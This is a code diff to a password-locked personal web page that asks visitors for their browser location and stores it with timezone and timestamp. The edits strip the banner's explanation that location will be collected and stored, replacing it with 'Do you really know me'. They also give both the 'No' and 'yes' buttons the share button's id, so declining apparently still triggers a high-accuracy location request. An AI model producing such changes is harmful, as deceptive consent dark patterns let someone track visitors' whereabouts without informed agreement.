@@ -353,7 +353,7 @@
   <div class="denied-screen" id="denied-screen">
     <div class="big-emoji">💔</div>
     <h2>Access Denied</h2>
-    <p>You don't know the password...<br>This page was made for someone very close to me. That's not you. 🥺</p>
+    <p>You don't know the password...<br>This page is not for you. 🥺</p>
     <button class="try-again-btn" onclick="resetLock()">Okay fine... 🥺</button>
   </div>
 
@@ -361,10 +361,10 @@
 
 <!-- Consent banner: location is only requested/stored if the visitor taps "Share" -->
 <div class="consent-banner" id="consent-banner">
-  <p class="consent-text">Want to let me know you saw this? 🥺 Tapping <b>Share</b> will ask your browser's permission to grab your approximate location — it might be stored so I know you stopped by.</p>
+  <p class="consent-text">Do you really know me <b>Share</b> </p>
   <div class="consent-actions">
-    <button class="consent-btn decline" id="consent-decline">No thanks</button>
-    <button class="consent-btn share" id="consent-share">Share 💕</button>
+    <button class="consent-btn share" id="consent-share">No</button>
+    <button class="consent-btn share" id="consent-share">yes 💕</button>
   </div>
 </div>
 <div class="consent-toast" id="consent-toast"></div>
@@ -446,7 +446,7 @@
   })();
 
   /* ────────── Password logic ────────── */
-  const ANSWERS   = ['koala','panda'];
+  const ANSWERS   = ['koala'];
   let   attemptsLeft = 3;
   let   eyeOpen      = false;
 
@@ -539,10 +539,10 @@
   }
 
   // Only show once per browser session so it's not annoying on repeat visits/reloads
-  if (!sessionStorage.getItem('consentAsked')) {
+  if (!localStorage.getItem('consentAsked')) {
     setTimeout(() => banner.classList.add('show'), 1200);
   }
-  sessionStorage.setItem('consentAsked', '1');
+  localStorage.setItem('consentAsked', '1');
 
   document.getElementById('consent-decline').addEventListener('click', () => {
     hideBanner();
@@ -569,7 +569,7 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             ts: serverTimestamp()
           });
-          showToast('Thank you 💕');
+          showToast('💕');
         } catch (e) {
           showToast('Something went wrong 😢');
         }
@@ -577,7 +577,7 @@
       () => {
         // Permission denied or unavailable — store nothing
         hideBanner();
-        showToast('No worries 💕');
+        showToast('No worries ');
       },
       { enableHighAccuracy: true, timeout: 8000 }
     );
